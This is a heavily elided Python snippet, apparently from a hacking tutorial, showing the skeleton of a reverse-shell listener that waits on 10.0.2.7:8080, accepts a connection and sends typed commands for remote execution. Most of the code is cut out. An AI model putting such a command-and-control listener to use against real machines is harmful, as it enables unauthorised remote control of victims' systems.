...
class SocketListener:
    def __init__(self, ip, port):
        ...
        print("Connection Done from " + str(my_address))
    ...
    def command_excution(self,command_input):
    ...
    def start_listener(self):
        while True:
            command_input = raw_input("Enter a command: ")
            ...
            try:
                ...
                command_output = self.command_excution(command_input)
...
my_socket_listener = SocketListener("10.0.2.7", 8080)
